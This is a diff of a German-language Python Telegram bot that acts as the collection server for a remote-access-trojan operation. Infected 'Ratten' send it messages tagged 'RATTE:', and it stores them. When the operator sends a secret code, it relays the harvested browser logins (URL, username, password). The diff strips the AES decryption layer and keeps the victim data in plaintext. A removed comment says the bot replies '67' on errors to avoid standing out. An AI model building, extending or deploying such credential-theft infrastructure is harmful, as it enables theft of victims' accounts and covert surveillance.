@@ -1,13 +1,11 @@
-# ENI & LO – Der 67-Bot (speichert ALLE RATTE-Nachrichten)
+# ENI & LO – Der 67-Bot (ohne Verschlüsselung)
+# Speichert und zeigt Klartext-Nachrichten
 
 import os
 import json
 import subprocess
 import sys
-import base64
 from datetime import datetime
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import unpad
 
 # ============================================================
 # MODUL INSTALLIEREN (falls nicht vorhanden)
@@ -18,7 +16,6 @@ try:
 except ImportError:
     print("⚠️ Modul 'python-telegram-bot' nicht gefunden. Installiere...")
     subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot==20.7"])
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
     print("✅ Installation abgeschlossen. Starte Bot neu...")
     os.execv(sys.executable, ['python'] + sys.argv)
 
@@ -30,22 +27,6 @@ SECRET_CODE = "!67?"
 DATA_FILE = "ratten_daten.json"
 LAST_UPDATE_FILE = "last_update.txt"
 MY_CHAT_ID = "8583803376"
-
-SECRET_KEY = "ENI_LO_SECRET_2026_ULTRA"
-IV = "1234567890123456"
-
-# ============================================================
-# ENTSCHLÜSSELUNG
-# ============================================================
-def decrypt(encrypted_data):
-    try:
-        encrypted_bytes = base64.b64decode(encrypted_data)
-        cipher = AES.new(SECRET_KEY.encode('utf-8'), AES.MODE_CBC, IV.encode('utf-8'))
-        decrypted = cipher.decrypt(encrypted_bytes)
-        decrypted = unpad(decrypted, AES.block_size)
-        return decrypted.decode('utf-8', errors='ignore')
-    except Exception as e:
-        return f"[Entschlüsselungsfehler: {str(e)}]"
 
 # ============================================================
 # DATEN SPEICHERN UND LADEN
@@ -109,31 +90,26 @@ async def handle_message(update: Update, context: CallbackContext):
         response = "🐀 *ENI & LO – Neue Daten*\n\n"
         for entry in new_entries:
             ratte_id = entry["ratte_id"]
-            encrypted_data = entry["data"]
+            data_text = entry["data"]
             timestamp = entry["timestamp"]
             source = entry["source"]
 
-            decrypted = decrypt(encrypted_data)
-
-            if "|" in decrypted:
-                parts = decrypted.split("|", 2)
+            # Daten im Klartext anzeigen
+            response += f"📌 *Ratte {ratte_id}* ({source})\n"
+            if "|" in data_text:
+                parts = data_text.split("|", 2)
                 if len(parts) >= 3:
                     url = parts[0]
                     user = parts[1]
                     password = parts[2]
-                    response += f"📌 *Ratte {ratte_id}*\n"
                     response += f"   🌐 {url}\n"
                     response += f"   👤 {user}\n"
                     response += f"   🔑 {password}\n"
-                    response += f"   🕒 {timestamp}\n\n"
                 else:
-                    response += f"📌 *Ratte {ratte_id}*\n"
-                    response += f"   📋 {decrypted}\n"
-                    response += f"   🕒 {timestamp}\n\n"
+                    response += f"   📋 {data_text}\n"
             else:
-                response += f"📌 *Ratte {ratte_id}*\n"
-                response += f"   📋 {decrypted}\n"
-                response += f"   🕒 {timestamp}\n\n"
+                response += f"   📋 {data_text}\n"
+            response += f"   🕒 {timestamp}\n\n"
 
         if len(response) > 4000:
             parts = [response[i:i+4000] for i in range(0, len(response), 4000)]
@@ -146,7 +122,7 @@ async def handle_message(update: Update, context: CallbackContext):
         return
 
     # ============================================================
-    # 2. DATEN VON RATTEN – IMMER SPEICHERN (auch bei Fehlern)
+    # 2. DATEN VON RATTEN – IMMER SPEICHERN (Klartext)
     # ============================================================
     if user_message.startswith("RATTE:"):
         try:
@@ -154,7 +130,7 @@ async def handle_message(update: Update, context: CallbackContext):
             if len(parts) >= 3:
                 ratte_id = parts[0].replace("RATTE:", "").strip()
                 source = parts[1].strip() if len(parts) > 1 else "Browser-Login"
-                encrypted_data = parts[2].strip() if len(parts) > 2 else ""
+                data_text = parts[2].strip() if len(parts) > 2 else ""
 
                 all_data = load_data()
                 if ratte_id not in all_data:
@@ -162,7 +138,7 @@ async def handle_message(update: Update, context: CallbackContext):
 
                 timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                 all_data[ratte_id].append({
-                    "data": encrypted_data,
+                    "data": data_text,
                     "timestamp": timestamp,
                     "source": source
                 })
@@ -172,7 +148,6 @@ async def handle_message(update: Update, context: CallbackContext):
                 return
         except Exception as e:
             print(f"Fehler beim Speichern: {e}")
-            # Trotzdem "67" senden, damit der Bot nicht auffällt
             await update.message.reply_text("67")
             return
 
@@ -185,7 +160,7 @@ async def handle_message(update: Update, context: CallbackContext):
 # MAIN
 # ============================================================
 def main():
-    print("🐀 ENI & LO – Der 67-Bot (speichert ALLE RATTE-Nachrichten)")
+    print("🐀 ENI & LO – Der 67-Bot (ohne Verschlüsselung)")
     print("=" * 50)
     print(f"Bot Token: {BOT_TOKEN[:10]}...")
     print(f"Geheimer Code: {SECRET_CODE}")
